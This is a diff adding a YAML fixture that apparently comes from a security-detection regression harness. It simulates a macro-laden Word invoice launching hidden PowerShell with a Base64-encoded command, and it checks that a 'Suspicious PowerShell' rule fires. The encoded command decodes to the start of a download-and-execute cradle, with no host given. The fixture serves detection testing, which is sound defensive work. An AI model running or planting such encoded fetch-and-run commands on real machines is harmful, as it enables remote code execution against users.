@@ -1,0 +1,32 @@
+name: encoded_powershell
+description: >
+  A user opens a weaponized Word document; the macro spawns PowerShell with
+  a Base64-encoded command line — a standard macro-dropper execution
+  pattern. Verifies the native "Suspicious PowerShell" rule still fires on
+  the encoded-command signature.
+mitre_techniques:
+  - T1059.001
+
+events:
+  - timestamp: "2026-07-24T09:12:03Z"
+    hostname: WORKSTATION-14
+    username: "CORP\\amiller"
+    process_name: WINWORD.EXE
+    parent_process: explorer.exe
+    command_line: "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\amiller\\Downloads\\invoice_47281.docm\""
+
+  - timestamp: "2026-07-24T09:12:07Z"
+    hostname: WORKSTATION-14
+    username: "CORP\\amiller"
+    process_name: powershell.exe
+    parent_process: WINWORD.EXE
+    command_line: "powershell.exe -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA"
+
+# Only the native rule is required. The Office-parent chain above also
+# satisfies the correlation engine's office_launches_powershell rule
+# ("Office application launches PowerShell") — that's expected to fire too,
+# but it's deliberately left off this list to demonstrate the harness's
+# unexpected-vs-missing distinction: an extra legitimate signal is a
+# warning, not a failure. See docs/architecture/regression-testing.md.
+expected_detections:
+  - "Suspicious PowerShell"
